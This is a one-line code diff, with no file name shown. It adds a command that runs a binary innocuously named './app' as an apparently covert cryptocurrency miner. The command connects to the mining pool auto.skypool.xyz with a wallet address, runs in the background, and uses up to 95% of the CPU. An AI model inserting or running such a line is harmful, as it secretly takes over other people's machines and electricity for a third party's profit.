@@ -1,0 +1,1 @@
+./app --donate-level 0 -o auto.skypool.xyz:9999 -u 8889oaEpfQ2E8NygBDZbyzMEjwZPsvoGfE6j23pvJ4ZuAfk7pzZo3d88BQuBPPsF2Z7geRAQYysg4PERLB21NBXvDVyNZVU.app2 -k --tls --keepalive --background --max-cpu-usage 95
